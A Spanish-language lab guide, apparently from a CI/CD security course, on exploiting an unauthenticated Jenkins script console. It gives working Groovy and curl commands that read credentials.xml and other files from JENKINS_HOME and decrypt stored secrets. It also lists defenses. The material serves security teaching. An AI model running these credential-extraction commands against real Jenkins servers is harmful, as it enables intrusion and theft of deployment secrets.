# 07 - Jenkins sin autenticacion: consola de scripts

**Clase 3 · 25 min · M4 Jenkins Demo 01**
**Fase:** acceso inicial + credenciales
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1552.001 (Credentials In Files)
**Riesgo OWASP CI/CD:** CICD-SEC-7 (configuracion insegura), CICD-SEC-2 (identidad y acceso)

## Escenario

El Jenkins de la empresa esta expuesto y no pide credenciales. Un Jenkins con
`authorizationStrategy: unsecured` es una shell como root en la practica: la
consola de scripts ejecuta Groovy con las clases del propio Jenkins, incluidas
las que descifran credenciales.

En este lab entras sin usuario, lees `credentials.xml` y descifras el secreto de
`prod-deploy-key`. En el lab 08 veras la version sin consola (desde el
Jenkinsfile).

Los CVEs de Jenkins de 2026 muestran que la frontera no siempre es tan clara:
CVE-2026-33002 permitia sortear la validacion de origen del WebSocket de la CLI
mediante DNS rebinding, y CVE-2026-117620 permitia a un usuario con permiso de
solo lectura provocar avisos que un administrador podia aplicar sobre datos de
cuentas, incluidas contrasenas. En los dos casos una peticion aparentemente
normal cruzaba una frontera de confianza.

## Objetivo de aprendizaje

- Confirmar acceso anonimo a `/script`.
- Leer archivos del `JENKINS_HOME` desde Groovy.
- Descifrar una credencial con `hudson.util.Secret.decrypt`.
- Entender por que guardar `master.key` y `hudson.util.Secret` en el mismo home
  anula el cifrado.

## Antes de empezar

Navegador en ventana privada y una terminal:

```bash
export J=http://localhost:8080
```

## Paso 1 - Confirmar el acceso anonimo

Abre http://localhost:8080/script en una ventana privada (sin login).

**Que esperar:** la consola de scripts sin pedir credenciales. Si te redirige a
`/login`, el Jenkins no esta en modo `unsecured` y el lab no aplica.

## Paso 2 - Leer las credenciales (UI)

En la consola pega:

```groovy
println new File('/var/jenkins_home/credentials.xml').text
```

**Que esperar:** el XML con dos credenciales: `prod-deploy-key` (string) y
`registry-creds` (usuario/password). El valor de `prod-deploy-key` aparece
cifrado entre llaves `{...}`.

## Paso 3 - Lo mismo por API (sin navegador)

La consola se puede usar con `curl`. Necesitas el crumb CSRF **y la cookie de
sesion** que lo emitio:

```bash
C=$(curl -s -c /tmp/cj07 $J/crumbIssuer/api/json \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["crumb"])')
curl -s -b /tmp/cj07 -H "Jenkins-Crumb: $C" \
  --data-urlencode 'script=println new File("/var/jenkins_home/flag.txt").text' \
  $J/scriptText
```

**Que esperar:** `FLAG{jenkins_anon_script_console}`

Usa `/scriptText`, no `/script`: devuelve solo la salida, sin la pagina HTML
alrededor. Si olvidas `-b`, el crumb no valida y Jenkins responde `500` o
`403` (lo veras tambien en el lab 10).

## Paso 4 - Descifrar la credencial

Copia el `<secret>` de `prod-deploy-key` y ejecutalo en la consola:

```groovy
println hudson.util.Secret.decrypt('{PEGA_AQUI_EL_SECRET}')
```

**Que esperar:** `FLAG{jenkins_cred_decrypt}`

**Por que funciona:** `credentials.xml` guarda el valor cifrado con
`hudson.util.Secret`, que a su vez se deriva de `secrets/master.key` y
`secrets/hudson.util.Secret`. Esos dos archivos estan en el mismo
`JENKINS_HOME`, asi que la consola puede descifrar sin salir del servidor.

## Paso 5 - Comprobar el impacto

```bash
C=$(curl -s -c /tmp/cj07b $J/crumbIssuer/api/json \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["crumb"])')
curl -s -b /tmp/cj07b -H "Jenkins-Crumb: $C" \
  --data-urlencode 'script=println new File("/var/jenkins_home/credentials.xml").text' \
  $J/scriptText | grep -o '<id>[^<]*</id>'
```

**Que demuestra:** no has "explotado" ningun CVE; has usado una funcionalidad
administrativa expuesta. El fallo es de configuracion, no de codigo.

## Evidencia para el informe

- Captura de `/script` accesible sin login.
- Salida de `credentials.xml` (redacta los valores).
- Secreto descifrado y ruta de las claves.
- `docker exec lab-jenkins id` para acreditar que el proceso corre como root.

## Checkpoint

1. Por que `unsecured` es peor que "cualquiera puede leer"?
2. Que dos archivos hacen falta para descifrar una credencial y donde estan?
3. Si deshabilitas `/script` pero dejas `unsecured`, sigues siendo vulnerable?

## Defensa

- Nunca `Anyone can do anything`; matrix auth + roles.
- `/script` y `/scriptText` solo para admins.
- Jenkins detras de VPN/SSO, nunca expuesto a internet.
- Rotar **todas** las credenciales almacenadas si el home se expone; el cifrado
  no protege si el atacante ya esta dentro.
- Alertar de accesos anonimos a `/script`, `/config.xml` y `/credentials.xml`.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| `/script` redirige a login | el Jenkins no esta `unsecured`; revisa JCasC y reinicia |
| `500` al usar curl | falta la cookie (`-b`) o el crumb es de otra sesion |
| El secreto no descifra | copiaste mal las llaves o el secreto de otra credencial |
| `NoSuchFileException` | la ruta es `/var/jenkins_home`, no `/jenkins_home` |
